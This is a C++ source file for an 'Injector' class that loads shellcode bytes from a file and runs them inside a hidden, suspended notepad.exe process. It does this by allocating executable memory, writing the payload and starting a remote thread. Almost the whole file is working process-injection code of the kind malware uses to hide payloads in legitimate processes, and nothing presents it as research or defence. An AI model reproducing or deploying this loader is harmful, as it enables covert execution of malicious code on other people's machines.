#include "../include/Injector.h"

Injector::Injector() {}

Injector::~Injector() {}


/**
 * @brief This method executes the shellcode in the context of a newly created process.
 * @param shellCode -> This is the shellcode to be executed.
 * @param shellCodeSize -> This is the size of the shellcode.
 * @return true, if the shellcode was executed successfully.
 * @return false, if the shellcode failed to execute.
 */
bool Injector::executeShellCode(const BYTE* shellCode, SIZE_T shellCodeSize)
{
    STARTUPINFOA startInfo;
    PROCESS_INFORMATION processInfo;
    ZeroMemory(&startInfo, sizeof(startInfo));
    ZeroMemory(&processInfo, sizeof(processInfo));
    startInfo.cb = sizeof(startInfo);

    if (!CreateProcessA(nullptr, (LPSTR)"notepad.exe", nullptr, nullptr, FALSE, CREATE_SUSPENDED | CREATE_NO_WINDOW, nullptr, nullptr, &startInfo, &processInfo))
    {
        std::cerr << "CreateProcess failed: " << GetLastError() << std::endl;
        return false;
    }

    LPVOID remoteMemory = VirtualAllocEx(processInfo.hProcess, nullptr, shellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory)
    {
        std::cerr << "VirtualAllocEx failed: " << GetLastError() << std::endl;
        CloseHandle(processInfo.hProcess);
        CloseHandle(processInfo.hThread);
        return false;
    }

    if (!WriteProcessMemory(processInfo.hProcess, remoteMemory, shellCode, shellCodeSize, nullptr))
    {
        std::cerr << "WriteProcessMemory failed: " << GetLastError() << std::endl;
        VirtualFreeEx(processInfo.hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(processInfo.hProcess);
        CloseHandle(processInfo.hThread);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(processInfo.hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMemory, nullptr, 0, nullptr);
    if (!hThread)
    {
        std::cerr << "CreateRemoteThread failed: " << GetLastError() << std::endl;
        VirtualFreeEx(processInfo.hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(processInfo.hProcess);
        CloseHandle(processInfo.hThread);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(processInfo.hProcess);
    CloseHandle(processInfo.hThread);
    VirtualFreeEx(processInfo.hProcess, remoteMemory, 0, MEM_RELEASE);

    return true;
}


/**
 * @brief This method loads shellcode from a file.
 * @param filePath -> This is the path to the file containing the shellcode.
 * @return std::vector<unsigned char> -> The shellcode loaded from the file.
 */
std::vector<unsigned char> Injector::loadShellCodeFromFile(const std::string& filename)
{
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file.is_open())
    {
        std::cerr << "Failed to open file: " << filename << std::endl;
        return {};
    }

    std::streampos size = file.tellg();
    std::vector<unsigned char> buffer(size);

    file.seekg(0, std::ios::beg);
    file.read(reinterpret_cast<char*>(buffer.data()), size);
    file.close();

    return buffer;
}
